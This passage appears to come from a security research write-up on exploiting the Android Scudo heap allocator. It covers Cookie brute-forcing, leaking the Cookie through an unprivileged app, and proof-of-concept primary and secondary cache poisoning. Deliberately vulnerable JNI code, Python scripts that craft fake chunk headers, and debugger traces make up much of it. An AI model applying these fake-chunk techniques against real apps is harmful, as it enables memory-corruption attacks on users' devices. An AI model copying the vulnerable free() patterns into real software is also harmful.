back to: brute - force!\nTurns out that using a multi - threaded application to brute - force the Cookie overshot the goal. E.g., if we are given:\npointer = 0x7bac6974fd30 header = 0x20d2000000010101 brute - forcing the Cookie s.t. computeChecksum(Cookie, pointer, zeroed_header) == checksum(header) is true resulted in roughly 120155 candidates over the course of 3 seconds\u0026hellip; running it for longer of course will yield more results:\n$ head cookies.txt 0x2a7e 0x2000539a 0x6000a052 0x4000d9b6 0x80009213 0xc00061db 0x20014924 0xe000183f 0x130c0 0xa000ebf7 Now one might argue that those cookie values are only valid for the above configuration. The funny thing is that at least some of them work for different configurations as well! This means that the pointer used to brute - force the cookie can be completely different from the pointer of our buffer! Of course neither every single value has been verified, nor is there a formal proof to why most of the above cookies work. Empirically speaking, e.g. 0x2a7e worked for crafting fake chunks etc. therefore bypassing the checksum verifications!\nUnprivileged App Due to the appification, one might argue that it nowadays is easier to execute an app on a targeted mobile device (assuming your average smartphone user) than it has been 10 years ago. Therefore, research regarding side channel attacks on mobile devices (e.g. see \u0026ldquo;An Insight into Android Side-Channel Attacks\u0026rdquo; for a rough overview on this topic) often assume that there is an unprivileged app already running on the targeted device.\nHence we could also assume that we can at least start an app on the target device. Notice that permissions for communication over the internet are normal permissions , i.e. they are specified in the android manifest file of an app and the user is only asked once per installation whether the permissions are fine or not. Therefore we may also assume that an app has almost arbitrary install - time permissions and can leak information via networking.\nAdding to the pile, on Android every app is forked from a process named Zygote64 . Convince yourself that libc.so\ncontains Scudo is loaded by Zygote64 Finally, there is only one instance of the allocator .\nConcluding, every app not only has access to the canary used in every app, but also to the Cookie used in every app. Thus, an unprivileged app can easily leak the cookie, therefore leaving us with almost the same setting as the information leak . The only difference is that we do not have a pointer, which we need to compute the checksum.\nSuitable JNI Code As always, we will consider small example modules for damnvulnerableapp. These will not represent real - world applications, but rather contain obviously vulnerable code like free(attacker_controlled_buffer + 0x10).\nAttack Scenarios on Scudo - related Vulnerabilities From this point onwards, we will try to derive attacks that are applicable to bugs that involve calls to Scudo - related functions like free. These attacks will be of the form Proof of Concept, i.e. e.g. we will already be satisfied, if construction of fake chunks works, instead of achieving arbitrary code execution. The idea here is to get to a comparable point wrt. other heap implementations like dlmalloc .\nFreeing Chunks that are not really Chunks For this section and following subsections we will assume that the target app contains JNI code similar to:\nuint8_t *buffer = malloc(0x10); ... free(buffer + x); // x = 0x10(primary) or 0x40(secondary) ... Disregarding the fact that no programmer would ever call free like this, there are always settings where the attention of a developer slips and comparable bugs occur. Also we could reinterpret this as calling free on an attacker - controlled pointer.\nWhen calling free, internally scudo_free is executed, which will wind up to call deallocate . There are a few checks we need to pass in order to get to the storage parts of chunks of the allocator:\n... // [1] Check alignment of pointer provided to deallocate if (UNLIKELY(!isAligned(reinterpret_cast\u0026lt;uptr\u0026gt;(Ptr), MinAlignment))) reportMisalignedPointer(AllocatorAction::Deallocating, Ptr); ... // [2] Check the checksum of the header. If it is corrupted, the process will be aborted! Chunk::loadHeader(Cookie, Ptr, \u0026amp;Header); // [3] Verify that the chunk is not double - freed if (UNLIKELY(Header.State != Chunk::State::Allocated)) reportInvalidChunkState(AllocatorAction::Deallocating, Ptr); ... // [4] Check that e.g. free is used for malloc\u0026#39;ed memory. if (Options.get(OptionBit::DeallocTypeMismatch)) { if (UNLIKELY(Header.OriginOrWasZeroed != Origin)) { if (Header.OriginOrWasZeroed != Chunk::Origin::Memalign || Origin != Chunk::Origin::Malloc) reportDeallocTypeMismatch(AllocatorAction::Deallocating, Ptr, Header.OriginOrWasZeroed, Origin); } } ... // [5] Check the size of the chunk const uptr Size = getSize(Ptr, \u0026amp;Header); if (DeleteSize \u0026amp;\u0026amp; Options.get(OptionBit::DeleteSizeMismatch)) { if (UNLIKELY(DeleteSize != Size)) reportDeleteSizeMismatch(Ptr, DeleteSize, Size); } // [6] This does the actual freeing quarantineOrDeallocateChunk(Options, TaggedPtr, \u0026amp;Header, Size); From the call to deallocate in scudo_malloc and the function signature of deallocate , we can infer that [5] is not relevant:\nINTERFACE WEAK void SCUDO_PREFIX(free)(void *ptr) { SCUDO_ALLOCATOR.deallocate(ptr, scudo::Chunk::Origin::Malloc); } NOINLINE void deallocate(void *Ptr, Chunk::Origin Origin, uptr DeleteSize = 0, UNUSED uptr Alignment = MinAlignment) {...} as DeleteSize defaults to 0! Therefore, as long as quarantineOrDeallocateChunk does not apply any more checks on the size, the size can be choosen arbitrarily, i.e. to our advantage.\nIn quarantineOrDeallocateChunk , there is a check that determines whether a chunk will be put into quarantine, i.e. its freeing will be hold back to avoid reuse - based attacks. The flag that represents this check is computed as follows:\n... // If the quarantine is disabled, the actual size of a chunk is 0 or larger // than the maximum allowed, we return a chunk directly to the backend. // This purposefully underflows for Size == 0. const bool BypassQuarantine = !Quarantine.getCacheSize() || ((Size - 1) \u0026gt;= QuarantineMaxChunkSize) || !NewHeader.ClassId; ... Notice that the comment states that \u0026ldquo;This purposefully underflows for Size == 0\u0026rdquo;, making BypassQuarantine = true for Size = 0 :) Therefore, even if the quarantine was activated by default (which it is not! Notice that Quarantine.getCacheSize() = thread_local_quarantine_size_kb \u0026lt;\u0026lt; 10, where thread_local_quarantine_size_kb = 0 ), we could bypass the quarantine by size = 0.\nThere are a few more interesting checks for the chunk (in the bypass branch):\nvoid *BlockBegin = getBlockBegin(Ptr, \u0026amp;NewHeader); const uptr ClassId = NewHeader.ClassId; if (LIKELY(ClassId)) { ... TSD-\u0026gt;Cache.deallocate(ClassId, BlockBegin); ... } else { ... Secondary.deallocate(Options, BlockBegin); } ... static inline void *getBlockBegin(const void *Ptr, Chunk::UnpackedHeader *Header) { return reinterpret_cast\u0026lt;void *\u0026gt;( reinterpret_cast\u0026lt;uptr\u0026gt;(Ptr) - Chunk::getHeaderSize() - (static_cast\u0026lt;uptr\u0026gt;(Header-\u0026gt;Offset) \u0026lt;\u0026lt; MinAlignmentLog)); } Observe that we control NewHeader.ClassId and Header-\u0026gt;Offset (maybe Header-\u0026gt;Offset can be used for memory probing ).\nFrom this point onwards, we can distinguish attacks that use the primary or the secondary!\nPrimary Poisoning If we want to get to Cache.deallocate, we will need NewHeader.ClassId \u0026gt; 0 to pass the check.\nInvestigating Cache.deallocate , which is the primary, reveals:\nvoid deallocate(uptr ClassId, void *P) { CHECK_LT(ClassId, NumClasses); PerClass *C = \u0026amp;PerClassArray[ClassId]; ... C-\u0026gt;Chunks[C-\u0026gt;Count++] = Allocator-\u0026gt;compactPtr(ClassId, reinterpret_cast\u0026lt;uptr\u0026gt;(P)); ... } Thus, if we get through all the checks, when Cache.deallocate is called, our fake chunk will be part of the list! One way to verify this is to create a JNI function of the form:\n#define BUFFER_SIZE 0x20 static uint8_t called = 0; static uint8_t *buffer = NULL; JNIEXPORT jbyteArray JNICALL Java_com_damnvulnerableapp_vulnerable_modules_PoCPrimaryPoisoning_free( JNIEnv *env, jobject class, jbyteArray chunk) { // Leaks the pointer of a global buffer on first call. if (!called) { called++; buffer = malloc(BUFFER_SIZE); // enough memory to store full classid 1 chunk jbyteArray ar = (*env)-\u0026gt;NewByteArray(env, 8); jbyte *leak = (jbyte*)\u0026amp;buffer; (*env)-\u0026gt;SetByteArrayRegion(env, ar, 0, 8, leak); return ar; } // Calls free(buffer + 0x10) and tries to avoid heap meta data overflows uint8_t *raw = (uint8_t*)(*env)-\u0026gt;GetByteArrayElements(env, chunk, NULL); uint32_t length = (*env)-\u0026gt;GetArrayLength(env, chunk); if (raw) { memcpy(buffer, raw, (length \u0026lt;= BUFFER_SIZE) ? length : BUFFER_SIZE); // Brings attacker - controlled chunk into primary free(buffer + 0x10); // combined header uint8_t *new = malloc(0x10); jbyteArray output = (*env)-\u0026gt;NewByteArray(env, 0x10); (*env)-\u0026gt;SetByteArrayRegion(env, output, 0, 0x10, new); return output; } return NULL; } Then, an attacker could write the header first, then 8 bytes of padding, followed by e.g. a string \u0026ldquo;Hello World!\u0026rdquo;. Lets see that in action!\nLets say the first call to this function leaked pointer = 0x7bac7976f730 and say we somehow got a cookie from a previous leak or so, Cookie = 0x2a7e. Then we could use the following code to craft the fake header:\ncombined_header = unpacked_header() combined_header.ClassId = 1 # Smallest allocation class --\u0026gt; primary, user_data_size=0x10 combined_header.State = 1 # = Allocated --\u0026gt; cannot free a free chunk combined_header.SizeOrUnusedBytes = 0 # Bypass quarantine (actually irrelevant) combined_header.OriginOrWasZeroed = 0 # = allocated via malloc combined_header.Offset = 0 # chunk_start ~= usr_ptr - header_size - offset combined_header.Checksum = utils.android_crc32( cookie, # 0x2a7e pointer + 0x10, # buffer = 0x7bac7976f730 =\u0026gt; buffer + 0x10 fake user data combined_header.pack() # u64 representation of this header, with checksum=0 ) With the above, the header looks like 0x75a5000000000101 (mind little - endian).\nIf we send combined_header.bytes() + p64(0) + b'Hello World! and set a breakpoint right before the call to free(buffer + 0x10), we get:\n... gef➤ i r rdi rdi 0x7bac7976f740 0x7bac7976f740 gef➤ x/4gx $rdi-0x10 0x7bac7976f730:\t0x75a5000000000101\t0x0000000000000000 0x7bac7976f740:\t0x6f57206f6c6c6548\t0x0000000021646c72 ... Notice that the leaked pointer is 0x7bac7976f730! So this looks promising! Stepping over free will either tell us that we messed up by aborting, or will work and thus our fake chunk is in the primary.\nIt seems to have worked! The next call is to malloc(0x10) (see that the actual chunk size will be 0x20, if malloc(0x10) is called, because header and padding are also stored). As combined_header.ClassId = 1, the chunk that we freed is part of the chunk array that is used to serve malloc(0x10) calls! Executing malloc(0x10) yields:\ngef➤ i r edi edi 0x10 0x10 gef➤ ni ... gef➤ i r rax rax 0x7bac7976f740 0x7bac7976f740 gef➤ x/s $rax 0x7bac7976f740:\t\u0026#34;Hello World!\u0026#34; Remember that we called free(buffer + 0x10) = free(0x7bac7976f730 + 0x10) = free(0x7bac7976f740)!\nTherefore, not only did we move a chunk of size 0x30 (includes header size 0x10; remember that buffer = malloc(BUFFER_SIZE = 0x20)) to the chunk array that contains chunks of size only 0x20. But we also served a \u0026ldquo;preinitialized\u0026rdquo; chunk. Notice that we basically performed two different things at the same time:\nServed an arbitrary chunk (we will soon see that this cannot be that arbitrary\u0026hellip;) Preinitialized data. This is actually unexpected, but a nice feature :) Basically, this allows us to infer that Options.getFillContentsMode() = NoFill , which comes from setting the flags where zero_contents = false and pattern_fill_contents = false ! This will result in a check that determines what to do with the contents to evaluate to false. Pitfalls and Challenges The above primary poisoning seems to work perfectly, but I have not told you what assumptions lie in the dark\u0026hellip;\nLets try to come up with a list of assumptions and constraints (ignoring the base assumption of availability of sufficient leaks and \u0026ldquo;classical\u0026rdquo; ones like that chunk addresses have to be aligned).\nThievish Threads As multiple threads share the same allocator (even the same TSD, which contains a cache that represents the primary), another thread could snack our fake chunk just introduced into the primary. Therefore, primary poisoning is probabilistic!\nMoreover the thread that runs the JNI function could be assigned another TSD , because the old one is overloaded, i.e. there are lots of threads using the same TSD. Again, we would never see our chunk again.\nIt looks like every thread could be assigned every TSD after sufficient execution time (further analysis is needed to fully prove this). This might be beneficial in some cases where we want to attack code that is running in another thread.\nMulti - Threaded Chunk Liberation The chunk array might be drained , because the amount of free chunks, represented by C-\u0026gt;Count , exceeds an upper bound. E.g. C-\u0026gt;MaxCount = 13 for class id 1, because we can distinguish the following cases for C-\u0026gt;Count:\nC-\u0026gt;Count = C-\u0026gt;MaxCount / 2 . This stems from the fact that deallocate can create batches if the corresponding Chunks array is full. To be precise, this will trigger the execution of drain , where C-\u0026gt;Count = C-\u0026gt;MaxCount. Therefore the minimum Count = Min(C-\u0026gt;MaxCount / 2, C-\u0026gt;Count) in drain will evaluate to 0 \u0026lt; C-\u0026gt;MaxCount / 2 \u0026lt; C-\u0026gt;MaxCount. Finally, C-\u0026gt;Count -= Count \u0026lt;=\u0026gt; C-\u0026gt;Count = C-\u0026gt;MaxCount - C-\u0026gt;MaxCount / 2 = C-\u0026gt;MaxCount / 2. Notice that C-\u0026gt;MaxCount = 2 * TransferBatch::getMaxCached(Size) . As can be seen in the next step, for malloc(0x10), this will result in C-\u0026gt;MaxCount = 2 * 13 = 26 =\u0026gt; C-\u0026gt;Count = 26 / 2 = 13. C-\u0026gt;Count = MaxCount , i.e.: C-\u0026gt;Count = MaxCount = TransferBatch::getMaxCached(Size) = Min(MaxNumCached, SizeClassMap::getMaxCachedHint(Size)) = Min(13, Max(1U, Min(Config::MaxNumCachedHint, N))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; Config::MaxBytesCachedLog) / static_cast\u0026lt;u32\u0026gt;(Size)))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; 13) / Classes[ClassId - 1]))) where Classes : static constexpr u32 Classes[] = { 0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00080, 0x00090, 0x000a0, 0x000b0, 0x000c0, 0x000e0, 0x000f0, 0x00110, 0x00120, 0x00130, 0x00150, 0x00160, 0x00170, 0x00190, 0x001d0, 0x00210, 0x00240, 0x002a0, 0x00330, 0x00370, 0x003a0, 0x00400, 0x00430, 0x004a0, 0x00530, 0x00610, 0x00730, 0x00840, 0x00910, 0x009c0, 0x00a60, 0x00b10, 0x00ca0, 0x00e00, 0x00fb0, 0x01030, 0x01130, 0x011f0, 0x01490, 0x01650, 0x01930, 0x02010, 0x02190, 0x02490, 0x02850, 0x02d50, 0x03010, 0x03210, 0x03c90, 0x04090, 0x04510, 0x04810, 0x05c10, 0x06f10, 0x07310, 0x08010, 0x0c010, 0x10010, }; So for a small allocation, i.e. for ClassId = 1, we get:\nC-\u0026gt;MaxCount = Min(13, Max(1U, Min(13, 0x2000 / 0x20))) = Min(13, Max(1U, Min(13, 256))) = Min(13, Max(1U, 13)) = 13 Lets say we have C-\u0026gt;Count = 13 and we introduce our fake chunk. Then, on execution of deallocate , we get that C-\u0026gt;Count = C-\u0026gt;MaxCount and therefore drain is called. By itself, this would not be an issue, because drain will only remove the oldest half of the chunks and move the other chunks to the front of the array. But what happens, if there is another thread that wants to free memory? Assuming that the thread performs C-\u0026gt;MaxCount / 2 + 1 calls to deallocate, this will trigger drain again and therefore result in our chunk being pushed back onto a free list.\nFake Chunk Mispositioning The fake chunk may be \u0026ldquo;at the wrong location\u0026rdquo;. To that end, notice that compacting a pointer is done as follows:\nCompactPtrT compactPtr(uptr ClassId, uptr Ptr) { DCHECK_LE(ClassId, SizeClassMap::LargestClassId); return compactPtrInternal(getCompactPtrBaseByClassId(ClassId), Ptr); } ... uptr getCompactPtrBaseByClassId(uptr ClassId) { // If we are not compacting pointers, base everything off of 0. if (sizeof(CompactPtrT) == sizeof(uptr) \u0026amp;\u0026amp; CompactPtrScale == 0) return 0; return getRegionInfo(ClassId)-\u0026gt;RegionBeg; } ... static CompactPtrT compactPtrInternal(uptr Base, uptr Ptr) { return static_cast\u0026lt;CompactPtrT\u0026gt;((Ptr - Base) \u0026gt;\u0026gt; CompactPtrScale); } Basically, a pointer is compacted by subtracting the base address of the region that belongs to a specific class id (e.g. 1) from that pointer and right - shifting the resulting relative offset by some value (often 4 , which makes sense in terms of alignment).\nWhen supplying an address from a different segment to free(addr + 0x10), we have to ensure that this address is bigger than the base address of the class the fake chunk \u0026ldquo;belongs\u0026rdquo; to. E.g. if we put a fake chunk on the stack, i.e. at 0x7babf2c25890 with a header of 0x2542000000000101, but the base of the region holding class id 1 chunks is 0x7bac69744000, then:\nsub 0x7babf2c25890, 0x7bac69744000 = 0xfffffffff894e189 -\u0026gt; underflow Notice that it is (most likely) an invariant that the base is always smaller than or equal to the address of the chunk to be freed. Therefore, this could be undefined behaviour! The bits 4 to 35 (inclusive) of 0xfffffffff894e189, i.e. 0xff894e18, will be stored in the Chunks array via (r15 = ptr to store):\n... 0x00007baef7fc106b \u0026lt;+523\u0026gt;:\tsub r15,QWORD PTR [rdx+rsi*1+0x60] # subtraction from above 0x00007baef7fc1070 \u0026lt;+528\u0026gt;:\tshr r15,0x4 0x00007baef7fc1074 \u0026lt;+532\u0026gt;:\tlea edx,[rax+0x1] 0x00007baef7fc1077 \u0026lt;+535\u0026gt;:\tmov DWORD PTR [r14],edx 0x00007baef7fc107a \u0026lt;+538\u0026gt;:\tmov eax,eax 0x00007baef7fc107c \u0026lt;+540\u0026gt;:\tmov DWORD PTR [r14+rax*4+0x10],r15d ... When malloc is called, then the following is executed (r14d = compacted pointer):\n... 0x00007baef7fbcba5 \u0026lt;+389\u0026gt;:\tmov r14d,DWORD PTR [rbx+rax*4+0x10] # r14d = compacted pointer 0x00007baef7fbcbaa \u0026lt;+394\u0026gt;:\tadd QWORD PTR [r15+0xf88],rcx # stats 0x00007baef7fbcbb1 \u0026lt;+401\u0026gt;:\tsub QWORD PTR [r15+0xf90],rcx # stats 0x00007baef7fbcbb8 \u0026lt;+408\u0026gt;:\tmov rax,QWORD PTR [r15+0xfa0] 0x00007baef7fbcbbf \u0026lt;+415\u0026gt;:\tlea rcx,[r12+r12*2] 0x00007baef7fbcbc3 \u0026lt;+419\u0026gt;:\tshl rcx,0x6 0x00007baef7fbcbc7 \u0026lt;+423\u0026gt;:\tshl r14,0x4 0x00007baef7fbcbcb \u0026lt;+427\u0026gt;:\tadd r14,QWORD PTR [rax+rcx*1+0x60] ... Essentially, malloc gets rid of the sign that we would get from free if it was not for unsigned subtraction, i.e. from subtracting something big from something small. Then this value is interpreted as an unsigned integer and added to the base address of the chunk id. The following calculations might clarify that:\ngef➤ p/x 0x7bac69744000 + 0xf86d04890 = base address + shifted compacted pointer $16 = 0x7bbbf0448890 = invalid address (reality) gef➤ p/x 0x7bac69744000 + (int)0xf86d04890 = signed addition! $17 = 0x7babf0448890 = wanted address (stack) malloc will return the (above malformed) chunk.\nIf the \u0026ldquo;malformation\u0026rdquo; is controllable, then this:\ncan enable memory testing/probing? Not sure how to avoid SIGSEG though\u0026hellip; can make arbitrary (accessible) memory regions available to an attacker, if the attacker has information about the process image\u0026hellip; With the above observations, we can infer that the least - significant 36 bits of an address that is supplied to free, with the property that this address is less than or equal to the base address of the region containing chunks with id 1, determine the value that is added to the base address. To be precise, only bits 4-35 (excluding bits 0, 1, 2, 3 and everything above 35) are relevant for the addition due to the right and left shifts. As in malloc the compacted pointer is shifted to the left by 4 and this shift operation is performed in a 64-bit register, this will result in the addend to be a multiple of 0x10, which matches the default alignment.\nLong story short, if we provided a fake chunk to free with an address that is less than the base address of the region that belongs to the respective class id, then the next malloc will cause a segmentation fault with high probability.\nSecondary Cache Poisoning It is also possible to introduce fake chunks into the secondary. To that end, we have to assume that the secondary is using a cache. Lets see some already familiar code to clarify that:\nif (LIKELY(ClassId)) { ... TSD-\u0026gt;Cache.deallocate(ClassId, BlockBegin); // \u0026lt;-- primary free ... } else { ... Secondary.deallocate(Options, BlockBegin); // \u0026lt;-- secondary free } ... As we are interested in the secondary, we can focus on the implementation of Secondary::deallocate :\ntemplate \u0026lt;typename Config\u0026gt; void MapAllocator\u0026lt;Config\u0026gt;::deallocate(Options Options, void *Ptr) { LargeBlock::Header *H = LargeBlock::getHeader\u0026lt;Config\u0026gt;(Ptr); const uptr CommitSize = H-\u0026gt;CommitSize; { ScopedLock L(Mutex); InUseBlocks.remove(H); // doubly linked list remove (??unlink??); can abort FreedBytes += CommitSize; NumberOfFrees++; Stats.sub(StatAllocated, CommitSize); Stats.sub(StatMapped, H-\u0026gt;MapSize); } Cache.store(Options, H); // caching or munmap, if enabled; otherwise just munmap } First of all, InUseBlocks is a doubly linked list , which contains all allocated secondary chunks. Also, some cache object is used to \u0026ldquo;free\u0026rdquo; the chunk. Taking an attacker\u0026rsquo;s perspective, we assume that we can control the entire LargeBlock::Header :\nPrev and Next pointers that make the header a part of a doubly linked list. CommitBase. Actual starting point of the chunk. Most of the time CommitBase = MapBase + PageSize. CommitSize. Actual chunk size to be used. Most of the time CommitSize = 2 * PageSize + RequestedSize. MapBase. Used for munmap. What is really returned by mmap. MapSize. Used for munmap. What is really used when using mmap to allocate memory. Data. Actually sizeof (Data) = 0, so we can ignore this! Now we can start to tamper around with some, if not all, of those fields.\nExcursion to remove Anyone, who is familiar with the unlink exploit , might now scream to investigate DoublyLinkedList::remove . As we have to pass through this method anyways, we can do a quick analysis:\n// The consistency of the adjacent links is aggressively checked in order to // catch potential corruption attempts, that could yield a mirrored // write-{4,8} primitive. nullptr checks are deemed less vital. \u0026lt;-- I think they know already :( void remove(T *X) { T *Prev = X-\u0026gt;Prev; T *Next = X-\u0026gt;Next; if (Prev) { CHECK_EQ(Prev-\u0026gt;Next, X); Prev-\u0026gt;Next = Next; } if (Next) { CHECK_EQ(Next-\u0026gt;Prev, X); Next-\u0026gt;Prev = Prev; } if (First == X) { DCHECK_EQ(Prev, nullptr); First = Next; } else { DCHECK_NE(Prev, nullptr); } if (Last == X) { DCHECK_EQ(Next, nullptr); Last = Prev; } else { DCHECK_NE(Next, nullptr); } Size--; } Lets formulate two questions of interest:\nHow can we abuse LargeBlock::Header::Next and LargeBlock::Header::Prev to get a Write - What - Where condition? How do we pass through this method without triggering an abort, i.e. without failing any of the assertions like CHECK_EQ(Prev-\u0026gt;Next, X)? Starting off easy, we can see that choosing X-\u0026gt;Next = X-\u0026gt;Prev = 0 will cause execution of DCHECK_NE(Prev, nullptr) and DCHECK_NE(Next, nullptr). Observe that X, i.e. our fake large header is not part of the list. Therefore First != X and Last != X!\nSetting X-\u0026gt;Next = buffer and X-\u0026gt;Prev = 0 results in a call to CHECK_EQ(Next-\u0026gt;Prev, X). Thus, our buffer has to contain a pointer that points back to X, which seems pretty unlikely, but still possible. Still, as First != X and X-\u0026gt;Prev = 0 we abort due to DCHECK_NE(Prev, nullptr).\nFinally, X-\u0026gt;Next = buffer_0 and X-\u0026gt;Prev = buffer_1 enforces buffer_0 and buffer_1 to contain pointers that point back to X.\nA trivial way of passing this function is to choose X-\u0026gt;Next = X-\u0026gt;Prev = X. This ensures that X-\u0026gt;Next and X-\u0026gt;Prev always point back to X with non - zero pointers. Notice that this requires that we know the address of X! If this is the case, then DoublyLinkedList::remove behaves almost like a nop, with the side effect that Size -= 1 per call. (see future work for more)\nAlso notice that Prev-\u0026gt;Next and Next-\u0026gt;Prev will only be overwritten, if they point back to X. As X is most likely not part of the InUseBlocks list, this implies that we can already write to those locations or we can only write to locations that point back to our buffer. Thus, a Write - What - Where condition seems impossible on first analysis.\nIntroducing Fake Chunks to Secondary The AndroidConfig defines the SecondaryCache to be of type MapAllocatorCache . Therefore, there is another caching layer to be bypassed / abused.\nIf Cache.store cannot cache the chunk that is currently freed, then the chunk will just be unmapped using munmap.\nIf we passed the canCache check, it should be possible to craft fake chunks for the secondary as well, because of the caching mechanism. To that end, assuming that canCache(H-\u0026gt;CommitSize) == true, we end up in the following code\n... if (Config::SecondaryCacheQuarantineSize \u0026amp;\u0026amp; useMemoryTagging\u0026lt;Config\u0026gt;(Options)) { QuarantinePos = (QuarantinePos + 1) % Max(Config::SecondaryCacheQuarantineSize, 1u); [1] if (!Quarantine[QuarantinePos].CommitBase) { Quarantine[QuarantinePos] = Entry; return; } [2] CachedBlock PrevEntry = Quarantine[QuarantinePos]; Quarantine[QuarantinePos] = Entry; if (OldestTime == 0) OldestTime = Entry.Time; Entry = PrevEntry; } if (EntriesCount \u0026gt;= MaxCount) { if (IsFullEvents++ == 4U) EmptyCache = true; } else { [3] for (u32 I = 0; I \u0026lt; MaxCount; I++) { if (Entries[I].CommitBase) continue; if (I != 0) Entries[I] = Entries[0]; Entries[0] = Entry; EntriesCount++; if (OldestTime == 0) OldestTime = Entry.Time; EntryCached = true; break; } } ... Thus there are three interesting paths of execution:\nNo quarantine, i.e. we only run [3], which results in our chunks being placed in the cache! Non - full Quarantine, i.e. we run [1]. This will place our entry in the quarantine, but not in the cache! Eventually, the chunk will be cached, but it requires a full cycle of QuarantinePos for that to happen in this function (maybe there is another function that also increments QuarantinePos). Full Quarantine, i.e. we run [2]. Therefore, if the quarantine is filled with entries, this function will fetch the next entry from the quarantine, put our chunk into the quarantine and cache the fetched entry. A trivial attack for that is to fill the quarantine by calling scudo_free on a crafted large chunk that passes all the checks. Then, after at most Max(Config::SecondaryCacheQuarantineSize, 1u) + 1 many calls we are guaranteed to have our chunk cached. Afterwards, when calling MapAllocator::allocate , this will result in Cache::retrieve returning the first non - null cache entry, which is, with high probability (ignoring multi-threaded access), our fake chunk. This is similar to crafting a fake chunk with the primary , although we should not be limited by decompacting a pointer .\nIt does not seem like there is memory tagging enabled on my system. Therefore, there is no need to bypass the quarantine with the above attack\u0026hellip;the fake chunk can be added to the cache directly.\nLets try to craft a fake chunk for the secondary. To that end, lets assume we have the following setup:\n#define BUFFER_SIZE 0x100 uint8_t buffer[BUFFER_SIZE] = { 0 }; if (!called) { called++; jbyteArray ar = (*env)-\u0026gt;NewByteArray(env, 8); jbyte *leak = (jbyte*)\u0026amp;buffer; (*env)-\u0026gt;SetByteArrayRegion(env, ar, 0, 8, \u0026amp;leak); return ar; } uint8_t *raw = (uint8_t*)(*env)-\u0026gt;GetByteArrayElements(env, chunk, NULL); uint32_t length = (*env)-\u0026gt;GetArrayLength(env, chunk); if (raw) { memcpy(buffer, raw, (length \u0026lt;= BUFFER_SIZE) ? length : BUFFER_SIZE); // Brings attacker - controlled chunk into secondary cache free(buffer + 0x30 + 0x10); // large header + combined header // Triggers potential write - what - where condition. This could also be triggered by another // thread, although it might be problematic what that thread will write and how much... uint8_t *write_trigger = malloc(length - 0x40); memcpy(write_trigger, raw + 0x40, length - 0x40); free(write_trigger); } return NULL; On first execution of the above code snippet, the address of buffer = 0x7babf29407b0 will be leaked. For any other execution, we will try to call free(buffer + 0x30 + 0x10) and malloc(length - 0x40). Notice that length will be the length of the whole chunk including the headers. When calling malloc we have to provide the size of the user data that does not include the headers!\nSetting a breakpoint right before free yields:\ngef➤ i r rdi rdi 0x7babf29407f0 0x7babf29407f0 gef➤ x/8gx $rdi-0x40 0x7babf29407b0:\t0x00007babf29407b0\t0x00007babf29407b0 \u0026lt;-- 0x7babf29407c0:\t0x00007babf29407f0\t0x0000000000080040 |-- large header 0x7babf29407d0:\t0xffffffffffffffff\t0xffffffffffffffff \u0026lt;-- 0x7babf29407e0:\t0xd82d000000000100\t0x0000000000000000 \u0026lt;-- combined header + 8 bytes padding Again, if we pass all the checks, i.e. provided a correct large chunk, then the app will not abort and not cause a segfault. Also observe that the LargeBlock::Header::Prev and LargeBlock::Header::Next both point to the beginning of LargeBlock::Header. This is because the header has to pass InUseChunks.remove(H).\nThe header could be crafted in the following way:\n# Craft large header lhdr = large_header() lhdr.Prev = pointer # ensure that DoublyLinkedList::remove is nop lhdr.Next = pointer lhdr.CommitBase = pointer + 0x30 + 0x10 # pointer to user data lhdr.CommitSize = 0x400 * 0x200 + 0x40 # data + headers lhdr.MapBase = 0xffffffffffffffff # irrelevant; for debugging reasons set to -1 lhdr.MapSize = 0xffffffffffffffff # irrelevant; for debugging reasons set to -1 # Combined header combined_header = unpacked_header() combined_header.ClassId = 0 # Secondary allocations have class id 0 combined_header.State = 1 # = allocated combined_header.SizeOrUnusedBytes = 0 # irrelevant combined_header.OriginOrWasZeroed = 0 # = malloc\u0026#39;ed chunk combined_header.Offset = 0 # irrelevant (for now) combined_header.Checksum = utils.android_crc32( cookie, pointer + 0x30 + 0x10, # user data pointer: sizeof (LargeBlock::Header) = 0x30, sizeof (Chunk::UnpackedHeader) = 0x8, 8 bytes padding -\u0026gt; 0x40 combined_header.pack() ) # Send chunk data = b\u0026#39;\\x42\u0026#39; * 0x400 * 0x200 # 512KiB to trigger secondary allocation io.forward(lhdr.bytes() + combined_header.bytes() + p64(0) + data) Notice that canCache imposes an upper bound on LargeBlock::Header::CommitSize, which is 2 \u0026lt;\u0026lt; 20 . Observe that there is no lower bound to LargeBlock::Header::CommitSize that restricts us from introducing a fake chunk into the cache (see later for more on a lower bound)! (see future work for an attack idea that abuses the fact that malloc calls do not have any control over the size field. This implies that allocations that are in size range of the primary will be taken from the primary. Setting fake.CommitSize \u0026lt;= \u0026lt;max primary allocation size\u0026gt; will result in a dead cache entry, because it will be smaller than any requested size allocated by the secondary assuming that the primary did not fail to allocate)\nRight before calling malloc(buffer + 0x40) we have:\ngef➤ i r rdi rdi 0x80000 0x80000 gef➤ ni ... gef➤ i r rax rax 0x7babf2940830 0x7babf2940830 gef➤ x/8gx $rax-0x40 0x7babf29407f0:\t0x00007bac40c76fc0\t0x0000000000000000 0x7babf2940800:\t0x00007babf29407f0\t0x0000000000080040 0x7babf2940810:\t0xffffffffffffffff\t0xffffffffffffffff 0x7babf2940820:\t0x216a000000000100\t0x4242424242424242 As can be seen from the fields LargeBlock::Header::MapBase = -1 and LargeBlock::Header::MapSize = -1, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that mmap returned -1, which is not a valid user - space address on Android. Also observe that the last cached large chunk is retrieved first . Hence, if we called malloc next, then our fake chunk would be considered first!\nStill, there is something off:\nLargeBlock::Header::Prev = 0x00007bac40c76fc0, which is not our chunk. LargeBlock::Header::Next = 0x0000000000000000, so its the last element in InUseChunks LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40, where 0x7babf29407b0 was the address of the large header before calling free. But we can see that the CommitBase remained the same and also that the newly \u0026ldquo;allocated\u0026rdquo; chunk is now located at 0x00007babf29407f0, which is the CommitBase value of our fake chunk (technically, this could be a coincidence, because 0x7babf29407f0 = 0x7babf29407b0 + 0x40, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our buffer). As is the case with primary poisoning , the contents have not been cleared:\ngef➤ x/4gx $rax 0x7babf2940830:\t0x4242424242424242\t0x4242424242424242 0x7babf2940840:\t0x4242424242424242\t0x4242424242424242 which again allows for distinguishing fake 